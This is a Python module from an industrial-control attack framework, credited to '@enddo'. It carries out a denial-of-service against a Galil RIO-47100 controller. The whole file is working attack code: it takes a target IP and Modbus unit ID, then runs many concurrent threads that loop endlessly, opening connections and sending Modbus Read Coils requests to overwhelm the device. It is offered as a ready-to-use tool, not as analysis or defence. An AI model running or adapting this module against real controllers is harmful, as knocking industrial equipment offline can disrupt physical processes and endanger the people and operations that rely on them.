import os
import threading
import random

from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc

down = False
THREADS = list()
class Module:


	info = {
		'Name': 'DOS Galil RIO-47100',
		'Author': ['@enddo'],
		'Description': ("DOS Galil RIO-47100"),

        }
	options = {
		'RHOST'		:[''		,True	,'The target IP address'],
		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
		'UID'		:[''		,True	,'Modbus Slave UID.'],
		'Threads'	:[24		,False	,'The number of concurrent threads'],
		'Output'	:[False		,False	,'The stdout save in output directory']
	}	
	output = ''

	def exploit(self):

		moduleName 	= self.info['Name']
		print bcolors.OKBLUE + '[+]' + bcolors.ENDC + ' Module ' + moduleName + ' Start'
		for i in range(int(self.options['Threads'][0])):
			if(self.options['RHOST'][0]):
				thread 	= threading.Thread(target=self.do,args=(self.options['RHOST'][0],))
				thread.start()
				THREADS.append(thread)
			else:
				break
		for thread in THREADS:
			thread.join()
		if(down):
			self.printLine('[-] Modbus is not running on : ' + self.options['RHOST'][0],bcolors.WARNING)
		if(self.options['Output'][0]):
			open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOST'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
		self.output 	= ''

	def printLine(self,str,color):
		self.output += str + '\n'
		if(str.find('[+]') != -1):
			print str.replace('[+]',color + '[+]' + bcolors.ENDC)
		elif(str.find('[-]') != -1):
			print str.replace('[-]',color + '[+]' + bcolors.ENDC)
		else:
			print str

	def do(self,ip):
		global down
		if(down == True):
			return None
		while True:
			c = connectToTarget(ip,self.options['RPORT'][0])
			if(c == None):
				down = True
				return None
			try:
				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU01_Read_Coils(),timeout=timeout, verbose=0)
			except:
				break
			
		
				

		
